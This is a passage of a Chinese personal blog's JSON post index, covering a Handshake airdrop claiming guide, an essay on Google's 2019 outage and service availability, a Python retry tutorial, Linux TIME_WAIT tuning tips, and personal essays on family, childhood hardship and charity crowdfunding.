30,000 keys from the PGP WOT Strongset have also been included in the tree.As a final addition, Hacker News accounts which are linked with Keybase accounts are included in the tree provided they were ~1.5 years old during the crawl.This merkle tree is computed and its root is added to consensus rules of the Handshake blockchain, allowing the owner of a key to publish a signed merkle proof on-chain in order to redeem their airdrop.With the final mainnet key list, every open source developer will receive 4,246.994314 HNS coins from the airdrop. 简单中文翻译下就是你的GitHub 有大于15个followers，可以在个人主页看到，如图所示： 然后GitHub需要绑定 SSH 公钥，并且本地能够通过SSH 的方式访问。 更具体的说明，大家可以看 https://github.com/handshake-org/hs-airdrop 下面我说下具体的操作步骤，首先你需要准备 安装git 能够访问外网，例如 Google nodejs &gt; &gt;= 8.0.0 github 有绑定ssh公钥 GitHub帐户的有添加 SSH密钥 拥有钱包地址，在 https://www.namebase.io/airdrop 注册即可获得 （需要能访问外网） 1.首先，克隆项目 1git clone https:&#x2F;&#x2F;github.com&#x2F;handshake-org&#x2F;hs-airdrop.git 2.克隆完项目后，执行 1cd hs-airdrop &amp;&amp; npm install 3.然后执行 1.&#x2F;bin&#x2F;hs-airdrop &lt;path to key&gt; &lt;address&gt; &lt;fee&gt; &lt;path to key &gt; 是你本地可以访问GitHub 账号的ssh密钥 &lt;address&gt; 是你的钱包地址，在https://www.namebase.io/airdrop 查看文档获取 fee 是给矿工的补偿，输入0.010即可 如果你符合条件，最后会返回一串base64的编码，如图所示 在 https://www.namebase.io/airdrop 末可以看到 在这里粘贴进去即可。 提交申请大约半小时即可到账。 如果你不满足条件，则会告诉你在查不到你的key。 作为开发者，如果你满足条件，不烦去试试看哦。这个羊毛还是蛮值得一试。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://awen.me/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://awen.me/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"谷歌解释周日宕机原因，如何保障系统高可用","slug":"谷歌解释周日宕机原因，如何保障系统高可用","date":"2019-06-10T01:29:00.000Z","updated":"2021-02-26T06:05:29.358Z","comments":true,"path":"posts/54071.html","link":"","permalink":"https://awen.me/posts/54071.html","excerpt":"","text":"谷歌解释周日宕机原因6 月 2 日，谷歌在全球范围内遭遇了大规模中断，包括Gmail、YouTube和Google Drive在内基于谷歌云架构服务的诸多谷歌服务均受到影响。本次宕机于北京时间6月3日凌晨2点58分开始，用户访问谷歌服务出现各种错误提醒，并且阻止用户访问电子邮件、上传YouTube视频等等。受影响的服务包括Gmail, Calendar, Drive, Docs, Sheets, Slides, Hangouts, Meet, Chat和Voice在内的谷歌服务均无法使用以及那些依赖于谷歌云架构的第三方服务同时也受到影响。 针对此次故障，Google 官方博客解释了事故原因：服务器配置变更导致。Google 称，配置变更原意是应用于单一区域的少数服务器，但却错误应用于多个毗邻区域的大量服务器，导致这些区域停止使用一半以上的可用网络容量，进出这些区域的网络流量试图适应剩余的网络容量，但未能成功。造成网络开始拥堵，网络系统对过载流量进行分类，丢弃了大部分对延迟不那么敏感的流量，以保护少数对延迟敏感的流量。Google 称它的工程师团队立刻探测到了问题，但诊断和修复花了更长时间。在此次事故期间，YouTube 流量下降了 10%，Google Cloud Storage 下降了 30%，1% 的 Gmail 活跃用户无法接收和发送邮件。 宕机是运维人员的痛其实，服务宕机一直是运维人员的”痛”，而运维人员因为有宕机的存在，一直素有”救火”和”背锅侠的”头衔，宕机的原因也多种多样，简单来说包括: 硬件故障导致的宕机 配置问题导致的宕机 网络异常导致的宕机 断电导致的宕机 系统或服务自身 BUG 引发的宕机 突发流量，例如双十一电商大促或遭遇流量攻击 可以说宕机问题在互联网行业大大小小的公司中是时有发生。 2019 年6月6日晚间，林志玲宣布婚讯引发微博短时间宕机 已逐步恢复，这已经不是新浪微博第一次因为明星结婚事件导致宕机了。 2019年3月3日凌晨，阿里云出现宕机，华北2地域可用区C部分ECS服务器等实例出现IO HANG。 2019年1月24日，微信系统瘫痪，从其他app分享内容到个人微信和微信群，都无法正常分享，页面显示红色感叹号。微信Bug话题也迅速被刷上微博热搜榜第一。 2018 年 8 月 5 日，北京清博数控科技有限公司（以下简称“前沿数控”）在官方微博发布了一篇题为《腾讯云给一家创业公司带来的灾难》的博文，文中表明，2018 年 7 月 20 日，腾讯云云硬盘发生故障（腾讯云后期给出的事故原因说明），导致该公司存放的数据全部丢失，并且不能恢复，这是该创业公司近千万元级的平台数据，包括经过长期推广导流积累起来的精准注册用户以及内容数据。 2018年9月12日，12306系统崩溃导致网站系统错误，多人无法购票，出票。给人们的出行带来了很大的困扰。 笔者从事云计算行业多年，为各行各业的客户提供公有云和私有云服务，在我的从业经历中，不论客户多大，都遇到多次宕机事故，我总结了下原因主要包括以下几点： 运维人员技术和职业素养不足 缺乏相关的运维保障流程和制度 缺乏相应的资金和人力投入将服务高可用化、自动化 没有完善监控报警机制 频繁的人工运维，导致出错几率飙升 没有安排 7*24 小时 on call。 服务不可弹性伸缩扩容 我上家公司是一家创业公司，在系统运维方面也是在不断的挖坑和踩坑中度过，在公司创业初期，面临和大多数公司一样的困局，缺资金、缺设备、缺专业的人才，后面公司不断壮大，慢慢的总结出自己的一套运维体系和制度，逐步的去完善使其能够保障服务的高可用和稳定性，我们的运维总监编了一套《运维八荣八耻》，具体如下： 以可配置为荣，以硬编码为耻 。 以系统互备为荣，以系统单点为耻 。 以随时可重启为荣，以不能迁移为耻 。 以整体交付为荣，以部分交付为耻 。 以无状态为荣，以有状态为耻 。 以标准化为荣，以特殊化为耻 。 以自动化工具为荣，以人肉操作为耻 。 以无人值守为荣，以人工介入为耻 。 总结起来就是，要将运维工作向 Devops 的方向发展，把人从繁重的运维工作中解脱出来，尽最大可能保障整个服务的自动化，避免人工运维，因为人在任何时候相比较机器和软件而言不可控的因素太多了。 宕机是无法避免的在云计算时代，当“上云”已经成为一家互联网企业的标配之后，IDC 在全球范围内针对多个行业下中小型企业（员工数小于 1000 名）的调研显示，近 80% 的公司预计每小时的停机成本至少在 2 万美元以上，而超过 20% 的企业估算其每小时的停机成本至少为 10 万美元。 上面的《运维八荣八耻》其实可以说是理想状态下的运维，是运维人员的一种追求和愿景，但是实际上，完全自动化是不可能实现的，因为企业的发展是要以业绩为核心，而业绩的来源是用户需求，用户就是爸爸，很多时候”爸爸”提出的一个紧急变更，运维人员作为后方支撑是无法做到将其临时发布到线上实现自动化的。 此外，从经济学角度要考虑投入产出比，在针对一些不是关键的业务时，要考虑其投入是否大于产出，对于投入较大产出利润较低的服务并非一定需要高可用。因为采用高可用必然会增加成本。 再者，不存在一套拿来即用的完美架构，在产品和服务的不断迭代过程中，架构会随之而变，因此变更也会不断的出现，在变更过程中就有可能会发生一系列的意外，例如新老架构之间的配置、网络等等问题导致的意外故障，因此宕机问题是是无法避免。 最后，没有一套完美的制度和流程，制度和流程并非制定完成就万事大吉了，就像法律条文可能适用于当下，但是未来可能就不适用了，因此随着产品迭代和公司规模的扩大不停的演化，运维部门人员的增加，不断的发现问题解决问题。制定和流程是会变化的。 如何保障业务的高可用虽然宕机无法避免，但是一名合格的运维人员来说，尽最大可能保障核心服务高可用是运维人员的本职工作。 保障业务的高可用，并不只是运维部门的事情，很多人可能觉得高可用嘛，现在很多公有云上的服务，例如硬盘、操作系统、各种中间件都实现了高可用化了，但是其实不是这样的，一个服务的高可用是需要其他部门的配合共同保障服务的稳定运行。 首先，在开发过程中要让开发人员也参与到运维中，例如 Netflix 从一开始就强调开发人员进行自助化运维，他们的理念是：谁构建，谁运维。其运维工作全部由开发人员完成，只保留极少的 Core SRE 角色专门响应和处理严重等级的故障。 阿里技术团队在 2016 年左右开始了一次大的组织架构调整，即把日常的运维工作交给研发做。原来的 PE（Production Engineer）要么转岗去做工具平台开发，要么作为运维专家做产品规划和设计，还有一部分无法适应的只能黯然离开。 其次，不要将每一次发布变更直接发布到线上，比有测试环境应当现在测试环境发布后进行相关测试，确认无误后在发布到线上环境，在线上环境也应当避免直接全网发布，而是要先选择灰度发布，减少因为错误而导致的服务不可用，从而造成重大的故障。 再次，架构部门或相应服务的架构人员要在架构设计时考虑到任何可能影响服务不可用的因素例如： 面的突发流量时如何才可以迅速的进行扩容 如何避免单点故障 当系统出性能瓶颈如何快速提高性能 当单节点出现故障如何快速迁移和恢复服务 如何减少人工运维 这一系列问题都应当在一个服务上线时要考虑清楚并制定相应的备用方案和相关问题处理流程的引入。 最后，才是运维部门要做的事情，运维部门主要工作是： 在业务上线前要进行相关的压测，发现性能瓶颈并优化，例如到底是硬件问题导致的瓶颈还是系统层面的问题还是应用本身的问题导致的，不同的问题优化方案是不一样的，有的问题是需要加机器解决，有的问题是需要优化参数，例如服务本身的参数或内核参数解决，有的是需要开发人员进行代码方面的优化解决。 加强运维流程和制度的建设，完善运维体系建设，将运维过程中的各个环节都进入流程考虑每一步操作可能带来的影响。 对于运维人员的安全意识进行培训 对系统权限进行控制，不同的角色赋予不同的权限，避免越权操作，做到责任到人。 加强和完善监控报警体系的建设 7*24 小时安排人员轮流值守，一旦发现问题可以迅速响应 其实，并不是按照上面这样做就高枕无忧了，在实际的生产环境中会遇到各种各样的风险和各种各样的问题，我们需要做的就是在不断的发现问题和解决问题，在每一次故障后梳理故障发生的原因以及改进措施，避免下一次发生同样的错误。 本文仅授权 CSDN 公众号使用，如需转载请联系 CSDN","categories":[],"tags":[{"name":"科技资讯","slug":"科技资讯","permalink":"https://awen.me/tags/%E7%A7%91%E6%8A%80%E8%B5%84%E8%AE%AF/"}]},{"title":"python 如何实现异常自动重试","slug":"python-如何实现异常自动重试","date":"2019-06-04T03:24:58.000Z","updated":"2021-02-26T06:05:29.283Z","comments":true,"path":"posts/51991.html","link":"","permalink":"https://awen.me/posts/51991.html","excerpt":"","text":"在很多时候，因为网络原因或调用其他函数出现异常导致程序中断退出，而我们其实并不希望他就这样退出而是希望其自动重试。 如果自己写的话大概是这样的步骤，写个死循环，根据条件判断，如果为真则退出，否则继续执行。。。 但是这样很麻烦，不符合 Python 的风格 好在，Python 提供了一个 retry 的包，他能够通过装饰器的方式为某个方法进行重试，如果成行出现异常则根据定义的参数进行相应的重试。 github 地址 https://github.com/invl/retry 123456from retry import retry@retry()def make_trouble(): &#39;&#39;&#39;Retry until succeed&#39;&#39;&#39; 其初始化函数如下： 1234567891011121314def __init__(self, stop&#x3D;None, wait&#x3D;None, stop_max_attempt_number&#x3D;None, stop_max_delay&#x3D;None, wait_fixed&#x3D;None, wait_random_min&#x3D;None, wait_random_max&#x3D;None, wait_incrementing_start&#x3D;None, wait_incrementing_increment&#x3D;None, wait_exponential_multiplier&#x3D;None, wait_exponential_max&#x3D;None, retry_on_exception&#x3D;None, retry_on_result&#x3D;None, wrap_exception&#x3D;False, stop_func&#x3D;None, wait_func&#x3D;None, wait_jitter_max&#x3D;None) stop_max_attempt_number：用来设定最大的尝试次数，超过该次数就停止重试 stop_max_delay：比如设置成10000，那么从被装饰的函数开始执行的时间点开始，到函数成功运行结束或者失败报错中止的时间点，只要这段时间超过10秒，函数就不会再执行了 wait_fixed：设置在两次retrying之间的停留时间 wait_random_min和wait_random_max：用随机的方式产生两次retrying之间的停留时间 wait_exponential_multiplier和wait_exponential_max：以指数的形式产生两次retrying之间的停留时间，产生的值为2^previous_attempt_number * wait_exponential_multiplier，previous_attempt_number是前面已经retry的次数，如果产生的这个值超过了wait_exponential_max的大小，那么之后两个retrying之间的停留值都为wait_exponential_max。这个设计迎合了exponential backoff算法，可以减轻阻塞的情况。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://awen.me/tags/python/"}]},{"title":"我的婚姻观家庭观","slug":"我的婚姻观","date":"2019-06-02T02:47:11.000Z","updated":"2021-02-26T06:05:29.335Z","comments":true,"path":"posts/8891.html","link":"","permalink":"https://awen.me/posts/8891.html","excerpt":"","text":"我老家属古徽州山区，几乎每个村子都有一座祠堂，古徽州出了个名人朱熹（现婺源人），朱熹那个时期开始搞的家族宗族制度一直流传至今，男方娶妻结婚当天必须要祭祖，就相当于这个女人嫁到了你家里，是你家的人了。 在我们老家，男方娶妻会给女方一笔彩礼钱，当然这个也因家庭而异，不过一般在几万块钱不等。女的如果要找男的入赘也会给，但是这笔彩礼就相当于买断了一个人一样，从今往后你就不再是原生家庭的人了。除了逢年过节回家，其他时间都得在婆家待着。不过这种风气最近几年有所减缓，因为年轻的子女不可能和父母常住一起的。 婚后，家里有亲戚过来聚餐，主妇都是去做饭炒菜，然后等客人吃完了，在捧个碗上桌吃剩饭剩菜。我特别反感这个，这是对女性的贬低，我不仅仅反感这个，我对很多农村陈旧迂腐的风俗都抱有抵触之情绪，我觉得很多规矩都是在压抑人的个性，束缚人的思想和行为。 很多农村父母跟儿女的关系甚至婆媳的关系搞不好，其中很大原因就是父母和儿女之间缺乏界限感，父母总觉得儿女是自己身上掉下来的肉（我妈经常说），就觉得对你的任何要求都是理所应当的，你必须听话去做，如果反抗就是不孝（我经常跟我爸顶嘴，我妈妈就说我不孝，完全不平等有木有）。甚至有的家庭把这个思想还强加到儿媳妇身上，认为儿媳妇也应当和儿子一样怎样怎样，另外他们也会毫无保留的对儿女付出，他们希望对你毫无保留的付出，而你也应当要等他们老了回馈他们，这就是养儿防老的意义所在吧，可是有时候他们给予的东西并不是儿女想要的。打个比方，做了一桌菜，非得一直说个不停的要求别人去吃某个菜，可是有的人就是不喜欢吃，那你还能咋地，最合适的方法不是你爱吃什么自己看着办吗。还有小孩子不吃饭，不吃就不吃了，非得强迫着吃。我觉得很无语。 在我的眼里，家庭成员的重要程度是 我自己的家庭和朋友圈 &gt; 我父母的家庭和朋友圈 &gt; 我妻子的父母的家庭和朋友圈 首先，我觉得要和自己的父母保持一定的距离感，杜绝父母过于介入自己的生活，保持独立性。在组建自己的家庭后，最亲密的人应该是自己的妻子然后是孩子，孩子排在妻子后面，在后面是双方的父母，而双方父母我觉得各自管各自的父母，互为辅助，意思就是我爸妈的事情我来管，你爸妈的事情你来管，如果需要帮忙打下手互相帮衬着，但是一定是谁的父母谁管的多。毕竟中国人血浓于水，婆婆和亲妈还是有很大区别的，女婿和儿子也是有很大差异的。 至于双方的亲戚不在考虑之中，包括双方的妹妹啊弟弟哥哥之类的，其他的表哥表嫂舅舅之类的见面互相尊重即可，如果性格合得来则深交，如果不合不来往即可。 我是很讨厌过年过节走亲戚的，除了血亲，有的亲戚根本就没怎么交流，除了家里办大事会参与下，平时根本没什么交集，这种关系脆弱的不能在脆弱了，要他何用。 在结婚这件事情上，我认为结婚是相爱的两个人自己的事情，双方父母如果可以帮忙，那固然很好，但是不能乱了顺序。带孩子始终是夫妻两个人自己的事情，经济上要保持独立，因为只有这样才能阻止长辈过于干预自己的婚后生活，避免各种家庭矛盾。我觉得不管是谁拿了人的钱始终有种吃人最短的感觉，哪怕是亲身父母，我认为不能让双方父母义务帮助自己劳动，比如说带孩子这件事，要让对方知道，我们的距离感。结了婚就是脱离了双方的原生家庭，在自己的家庭面前，双方父母的家庭关系就跟亲戚一样。亲戚是什么样对他们就是什么样，尊重对方的各种生活习惯和为人处世方式，互不干预。 我是强烈反感将自己的孩子完全交给父母去带的，首先，父母的观念和行为我不想他影响我的孩子，其次，那是你自己的孩子，不是父母的，没有这个义务。 如果父母在结婚上帮助自己，比如说出钱出力了，要还回去，没有谁的钱是大风刮来的，父母帮是情分，不帮也不要说什么，成年之后父母不欠谁的，其实我倒是希望他们能为自己打算，因为我觉得他们忙忙碌碌一辈子，早该好好休息了，我不希望他们经常“关心”我的生活，打着现在这么努力拼命的干活都是为了你怎么怎么的，我受不起这样的大恩大德，真的，压力特别大。 我很讨厌孝这个东西，尤其是利用孝来道德绑架，父母生我我，没有经过我同意就把我带到这个世界上，成年之前我完全没有任何养活自己的能力，那都是他们应尽的责任，否则就别生了啊，动不动就给儿女灌输都是为了你好，搞得就你不容易，哪个做父母的不是一样的养孩子，真的不用过分在我面前强调这种东西，而且说实话你们也是最低配置的养活儿女，根本就谈不上伟大。法律应尽的赡养义务我肯定不会落下，但是不要动不动就给我灌输这种孝道，我非常反感，这种逻辑的背后其实目的性超级强，他时时刻刻提醒着我现在对你怎么怎么样，你以后不能丢下我，得为我养老，得照顾我。而且很多农村父母觉得自己儿子儿媳妇不跟自己住一起就是不跟自己一起过了，很伤心。我觉得这是何必呢？本来就是两个不同年代的人，非要凑一起，各种生活习惯，观念都不一样。一起过日子不觉得很违和吗？天天因为各种鸡毛蒜皮的事情闹纠纷闹矛盾很好玩吗？各过各的生活，除非大事情喊上儿女，平时你爱干嘛干嘛，做自己喜欢的事情没人管不挺好吗？ 如果做不到经济独立，那就活该被父母干预，谁让你自己没能力保持独立。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"我的童年时光","slug":"我的童年时光","date":"2019-06-01T02:19:11.000Z","updated":"2021-02-26T06:05:29.336Z","comments":true,"path":"posts/28200.html","link":"","permalink":"https://awen.me/posts/28200.html","excerpt":"","text":"又是一年六一，属于孩子们的节日。 回想自己的童年，并没有多少快乐的日子！我小时候所生活的环境和阶层给我带来了巨大的痛苦和苦恼，不论是身体上的还是心灵上的，至今，我都认为那段童年时光给我造成的心灵上的伤痛是这辈子都无法愈合的。 我出生于皖南的山区一户农民家庭，家里世世代代都是农民，父母没念过什么书，因此文化水平很低。家里靠的是种地、茶叶、杉木、油菜、水稻为生。我父母对我抱有很大的期望，他们望子成龙，希望自己的下一代能够早日摆脱这种面朝黄土背朝天的种地生活，我还有个弟弟，和我年纪差不多。 种地是不赚钱的，只能勉强糊口，参考为什么种地不赚钱，因此家里的经济并不富裕，一年还能赚点钱的时候也就是采茶，大概四月清明前后开始为期一个月，而且茶叶只有明前茶很还值点钱，但是这些都是辛苦钱，我爸妈每天早上五点多就起来，开始洗衣服煮饭然后大概 6 点就上山采茶，到下午 7 点到家，完了就开始自己炒茶、烘茶叶，这样一来就到了凌晨了，我爸早上四五点就骑车把茶叶带到镇上去卖。大概能卖一两百块钱。我就觉得他们的日子过得非常苦。 我感觉他们俩每天都很忙，起早贪黑，但是这样忙忙碌碌的日子并不能改变家里的经济条件，而且干的都是脏活累活，至今，我爸已经五十多岁了，还一个人爬到山顶去伐木背回来。 他们在高山之上种了 30 亩的杉木，然而这些树木并不能变现，或者变现很慢，因为国家有规定，伐木得取得资质，而且他是一根一根人工背到山脚，投入产出比严重不对等，农忙的时候就在家种地，农闲的时候就外出打工，这大概就是整个中国底层农民的现状，勤奋不能致富。投机取巧，紧跟政策才有钱赚。 原本以为这样的日子已经很苦了，但是不幸的是我这个家庭比其他家庭更苦，我奶奶在我很小的时候就双目失明，我爷爷是一个党员，但是他对这个家庭的贡献力度几乎为零，我爷爷生了三个女儿、一个儿子。我爸排行老三，在他们那一代，生七八个都是很正常的，我爸说他小时候锅巴汤都没得喝，因为多一个人家里就多一个劳动力，农村人是最喜欢生儿子的，参考传统社会为什么会有养儿防老，多一个男丁，家里就多一份强有力的帮手。因此，我很小的时候周末就开始帮家里采茶、割稻子、拔猪草、锄地、放牛。切身体会那种暴露在烈日之中被炙烤还要负担沉重的体力劳动汗流浃背所带来的苦难日子。我很反感这种没能力还生一堆孩子的方式。 我小时候很瘦弱，因为营养不良吧。从小到大几乎没怎么喝过牛奶，平时也吃的不好，在正是长身体的时候营养不良，小时候还贫血，当然现在我每天都喝200 毫升的牛奶，因为我知道钙和优质蛋白对于身体的重要性，而且经常流鼻血，稍微天气一热就开始自动流鼻血。家里平时很少吃肉、除了临近春节家里杀猪会吃点新鲜肉，平日里都是咸肉配点素菜一起炒，大多数时候都是全素的。而且我家那边特别喜欢吃腊肉，这玩意虽然好吃，但是没什么营养，而且高盐食物吃多了对身体也不好。但是没办法，条件有限， 一头猪杀了吃不完只能腌制了慢慢吃。 我父母觉得他们对我已经很好了，供我吃供我穿还供我上学已经比他们幸福多了。事实也确实如此，我比他们幸福多了，但是实际上这样的条件下，家里的每一笔开支都得精打细算，我也就每年过年能得到一些新衣服和便宜的玩具和一些烟花，平日里一件衣服和鞋子几乎一穿就是一年，于是我爸小时候对我异常严格和苛刻，我印象中他总是板着个脸，其实我也能理解，这样的家庭和生长环境，谁会有好脸色，谁又能开心的起来，小时候周末在家看电视，我爸干完活回到家看见我在看电视就直接过去把电视关掉，然后一顿训骂。可能他觉得我过的日子太爽了，而他自己却在干活累死累活的，但是他们的日子不是我造成的。我不能接受他们把对于现实不满的情绪发泄在我身上。因此，我的观念始终认为穷就不应该生孩子。 生在这样的家庭，家暴是少不了的，我经常被打和各种辱骂，我爸妈都打过我无数次，要多难听有多难听的骂，各种方式的虐待，打屁股、用扫把、竹棍抽的、跪在被劈开的柴火上、七月份的烈日当头时被要求光着脚站在水泥地里烫的脚都起泡。有时候都睡着了还会被从被子里面揪出来打骂一顿。他们坚信”不打不成器”这套理论。 有一次我被冤枉偷了我爸钱包的钱，我也忘记是多少了，好像是 100 块钱，但是我真的没有拿，而他骑个车子跑到学校，我当时正在上晚自习，被老师叫到教室外逼我承认错误，可是我真的没偷，我肯定不承认，于是被老师拉到他办公室用木棍抽打手掌心让我承认。我也是日了狗了，从这里可以看出那个年代，那个环境下大家的教育方式其实都一个样。包括这些老师都很没水平。 为了减少被打骂的次数，我在家表现的很勤快，帮忙洗碗、做饭、干农活。但是学习是一直好不了，可是他们最在乎的又是这个，于是还是经常被打和骂，这就是命吧！ 我爸妈看起来很重视教育，很重视学习，但是也仅仅是表面上重视吧，那样的环境和条件，能学好才怪，经济基础决定上层建筑，好的教育是得不断砸钱的，我从小到大学毕业几乎没有买过什么书，除了学校发的课本。因为没钱，初中毕业之前每个月的零花钱一只手都能数的过来，那时候一包方便面 1 块钱，中午放学不回家就是吃泡面。我本来小时候的记忆力和学习还是可以的，但是又一次我得了天花，请了 2 个月病假，等再次去学习学习进度就跟不上了。然后从此学习一落千丈，而且农村学校教育方式在今天来看也是非常有问题的，老师都是一些没什么水平的老师，和我父亲一样学不好就打，因此我非常厌学。 我父母也没给过我什么零花钱，哪怕是过年的压岁钱他们都是给收了回去说是给我当学费。对比其他父母，他们给我的除了基本的生活用品以外，真的没什么我觉得值得骄傲的拿出来说的东西。哪怕是生日也从来没收到任何惊喜，甚至电话问候都没有一个，因为他们不知生日为何物，都是我主动打电话给他们。 我从小到大最大的心愿就是逃离这样的原生家庭和这样的环境。 到了高中，去了县城上学，终于不用天天待家里了，我觉得整个人都解放了，但是去县城一个月生活费几百块根本是不够、除去吃饭买点生活用品所剩无几。而这样他们还认为我花钱厉害，但是他们并没有在外面生活过，哪里知道我这点生活费哪里够生活。 这就是我的童年，我总结为如下: 营养不良身材弱小，导致我经常被同学欺负，虽然我不主动惹他们，但是他们总是恃强凌弱的找我的茬。而我又不敢跟家里说，因为我说过几次，他们没有站在我的角度安慰我，而是骂我没有用。所以我就不主动跟他们说了。说白了，就是不信任他们，觉得他们靠不住。 没见识、没见过世面，16 岁之前没去过县城，真正涨见识也就最近几年的事情。 缺乏父爱、他们很少陪我谈心，存在严重的年龄代沟。很多事情不被理解反而挨骂挨打，心里很委屈，久而久之便没事不想和他们说话，直到今天我也很少和我父母电话，只是偶尔聊几句。我觉得这个隔阂是从小到大不断的积累起来的。看着他们就心累。 他们只会说教式的讲大道理和”棍棒”式教育，小时候经常被打和骂。 家里穷，日子过得清苦，但是这么多年他们还是重复同样的日子没有多少改变。导致很多时候很自卑，因为他们总是跟我哭穷，虽然是真的穷，导致我干事畏手畏脚，这个影响最严重。但是给我带来的是我很独立，因为我知道靠父母没希望，想干的很多事情只能靠自己，包括后来毕业后转行、培训、择业、选择伴侣等等都是我自己做决定。另外他们也不能帮我什么只能随我自己去了。 父母的思想观念落后，没文化+没见识+没钱，给我的成长没有带来什么有价值的东西，反而很多观念影响我阻止我进步，比如他们认为找个工作不要老跳槽，好好干努力干，老板就会给你涨工资，这真的是对资本一点都不了解，但是不懂还喜欢对我的人生指手画脚。 我写这些并不是为了表现自己很惨，我觉得穷也是一种不一样的经历和体验吧，今天我凭借自己的的努力生活质量和经济条件已经得到了很大的改善，我也并不是要痛斥我父母的行为，在那个年代，同龄的小伙伴或多或少都会被打骂过。父母的出发点是好的，但是这种教育方式以及学校的教育方式是不可能培养出合格的孩子。而这样的家长是不合格的。当然他们也没办法，我父母自己不舍得吃不舍得穿，但是在我身上毫不吝啬，当然他们也给不了什么值钱的东西，无非就是吃饭的时候多加个蛋，或多烧个荤菜他们觉得就是给的最好的了，我对他们的感情五味杂陈，说不上好也说不上坏。相比较我的一些同学和朋友，家里给首付买房或者全款买房，我父母一点都帮不上我。我只能靠自己。我也不知道是该欣慰还是还叹息。 2013 年，他们说老家盖房子给我当婚房，我说不要盖，我当时解释到，现在人工成本和钢筋水泥都很贵，你在老家盖个房子怎么也得 20 多万吧，不划算，而且我一年就回家待不到 2 周时间。如果以后结婚有了孩子，家里这种教育条件孩子不可能有出息的，可是他们没听我的，还是盖了三层小洋楼，说这说给我和我弟弟当婚房，有哪个女的现在愿意跟着我住农村过一辈子而且还是和兄弟住一起？他们虽然嘴上说为了我，但是实际上根本没有为我考虑过。而且如果那个时候在城里买了房，早翻倍了。我都不好说他们。不过我觉得他们既然盖都盖完了，那么就算是给他们改善下居住环境吧，于是我给家里添了电视、无线网络、以及沙发、茶几和简单的家具，不然这些东西指望他们自己掏钱买，不知道要何年何月才能住进去。 改革开放 30 多年，本来对于他们这一辈应该是最好的时间，可是他们一辈子猫在农村都没出过门，错过了多少机会。一直跟我强调他们没读过什么书，可是同村的一些和他们同龄的人也没读过书可是早早出去闯的几乎都混的非常好，有房有车开公司、政府当领导的很多。 贫穷太可怕了，它限制了一个人的自由和想象力以及改变自己的动力。让人自卑让人，总是把自己的问题归结于其他人身上，农村人非常迷信，比如我妈妈，我弟弟出车祸了，他们归结于是哪个逝去的亲人害了他没有保佑他。我差一点也陷进去了，如果当初听他们的话，只是找个工作一直干着，可能现在还是拿着几千块钱的工资艰难度日，幸好我早日醒悟，并且一直在和他们的灌输给我的观念做斗争，一直努力的改变他们那些破旧迂腐的观念对我的影响。 我妈稍微对我好一点我就觉得压力好大，因为他们总是跟我说为了我怎么怎么，平日里他们很少买肉吃，连鸡蛋都不舍得吃，煮饭的时候放几个鸡蛋唯独缺她自己的，只煮我爸我和我弟的，鸡蛋对于他们来说已经算是非常好的补品了，现在一回家就大鱼大肉的，说真的，我吃的一点都不舒服，满满的愧疚感，我觉得被他们绑架着，我觉得这个家庭是不平等的，然后说他和我爸这么努力干活还不是为了我和我弟，表现的很无私的样子，而我好像根本就没感觉他们帮了我啥大忙。他们给我任何东西，我都带着深深的负罪感，我不想欠他们的，更不想搞得感恩戴德的感激他们。 知乎问题家长要在孩子面前表露出「赚钱辛苦、我们家不富裕」这样的态度吗？ 我以前也曾恨过他们，我觉得任何贫穷的家庭出生的孩子都觉得投错了胎吧，至少我这样想过。后来，想通了，我觉得恨也没用，过去的都过去了，纠结无意义，抬头向前，靠自己努力挺好的。 另外我觉得如果你的父母没你混的好，那么他们给的建议千万不要采纳或者慎重采纳，不然会后悔终身。如果你正在受父母的传统思想束缚，最好的办法就是远离他们，不要住一起，尽早去改变这种家庭对你的影响。因为不逃离，影响你的不仅仅是父母还有他们身边的那些人，要积极的像比你更优秀的人学习，学习他们的做事做人方法和观念。虽然很势利，但是没办法，人总不能往低处走，水往高处流吧！这个社会一切的一切都是和利益挂钩的，包括父母生孩子没你想的那么伟大和无私。早点看清早点改变，等年纪大了，有可能你的观念都和他们一样定型了，想改也改不了。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Linux 网络优化思路","slug":"Linux-网络优化思路","date":"2019-05-30T09:17:19.000Z","updated":"2021-02-26T06:05:29.257Z","comments":true,"path":"posts/47801.html","link":"","permalink":"https://awen.me/posts/47801.html","excerpt":"","text":"在请求数比较大的场景下，你可能会看到大量处于TIME. WAIT状态的连接，它们会占用大量内存和端口资源。这时，我们可以优化与TIME_ WAIT状态相关的内核选项，比如采取下面几种措施。 增大处于 TIME_WAIT 状态的连接数量 net.ipv4.tcp_max_tw_buckets ，并增大连接跟踪表的大小 net.netfilter.nf_conntrack_max。 减小 net.ipv4.tcp_fin_timeout 和 net.netfilter.nf_conntrack_tcp_timeout_time_wait ，让系统尽快释放它们所占用的资源。 开启端口复用 net.ipv4.tcp_tw_reuse。这样，被 TIME_WAIT 状态占用的端口，还能用到新建的连接中。 增大本地端口的范围 net.ipv4.ip_local_port_range。这样就可以支持更多连接，提高整体的并发能力。 增加最大文件描述符的数量。你可以使用fs.nr_open 和 fs.file-max ，分别增大进程和系统的最大文件描述符数；或在应用程序的 systemd 配置文件中，配置 LimitNOFILE ，设置应用程序的最大文件描述符数。","categories":[],"tags":[]},{"title":"轻松筹还是轻松骗","slug":"轻松筹还是轻松骗","date":"2019-05-29T23:11:06.000Z","updated":"2021-02-26T06:05:29.358Z","comments":true,"path":"posts/37061.html","link":"","permalink":"https://awen.me/posts/37061.html","excerpt":"","text":"几乎一个月朋友圈都会有一些人转发各种救病筹款的消息，然而我的做法都是直接屏蔽他们。是我没有爱心吗？不，我曾经有过，但是我发现我的爱心被欺骗之后，我已经对这些信息的真实性产生质疑，因而导致我不想滥伐善心，其二，每个月都有几个转发这样的筹款消息，我也没那么多能力去帮助每个人啊。 两年前，我弟弟的一个同学的孩子发起筹款，然后我捐了钱，后来发现这筹款人的孩子大病之后居然还有能力买个车开，我自己都还没买车呢！ 